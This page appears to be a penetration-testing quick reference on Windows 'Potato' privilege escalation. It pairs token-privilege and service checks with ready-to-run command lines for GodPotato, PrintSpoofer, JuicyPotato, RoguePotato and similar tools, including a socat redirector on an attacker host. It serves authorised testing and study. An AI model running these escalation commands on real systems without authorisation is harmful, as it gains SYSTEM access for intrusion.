# Potato privilege escalation

[← Windows quick reference](../04-windows-privesc.md)

Select by token privilege and working RPC/service trigger, not OS version alone.

## Check the host

Service shell (IIS/MSSQL): check `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

```powershell
whoami /all
whoami /priv
Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture
[System.Environment]::Version
```

Check triggers:

```powershell
sc.exe query Spooler
sc.exe query EFS
sc.exe query RasMan
sc.exe query InventorySvc
sc.exe query PcaSvc
```

| What is available | Candidate |
| --- | --- |
| RPCSS/DCOM on a newer host | SigmaPotato or GodPotato |
| Print Spooler | PrintSpoofer |
| EFSRPC | SharpEfsPotato or PetitPotato |
| Older Windows with a matching elevated CLSID | JuicyPotato |
| External TCP/135 redirector and a matching COM route | RoguePotato |

Test with `whoami > file`; a spawned console may be invisible.

## Selected commands

DCOM/RPCSS:

```powershell
.\SigmaPotato.exe 'cmd /c whoami > C:\Windows\Temp\sigma.txt'
.\GodPotato-NET4.exe -cmd 'cmd /c whoami > C:\Windows\Temp\god.txt'
```

Check local binary syntax; read the output file.

Spooler running:

```powershell
.\PrintSpoofer64.exe -c 'cmd /c whoami > C:\Windows\Temp\print.txt'
```

EFSRPC trigger:

```powershell
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\sharp-efs.txt'
.\PetitPotato.exe 3 'cmd.exe /c whoami > C:\Windows\Temp\petit.txt'
```

Older host + matching elevated CLSID:

```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\juicy.txt' -t '*' -c '{<OS-MATCHING-CLSID>}'
```

RoguePotato: target must reach Kali TCP/135 redirector.

```bash
sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:<TARGET-IP>:9999
```

```powershell
.\RoguePotato.exe -r <KALI-IP> -e 'cmd.exe /c whoami > C:\Windows\Temp\rogue.txt' -l 9999
```

## When a choice fails

- A missing token privilege rules out these impersonation paths.
- Spooler being disabled rules out PrintSpoofer, but says nothing about EFSRPC or DCOM.
- A binary can fail because its service, endpoint, CLSID, .NET runtime, architecture, or network path is wrong for this host.
- Read the output file. "Exploit completed" is not an identity check.
- Remove staged binaries and test files after you finish.

## References

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato)
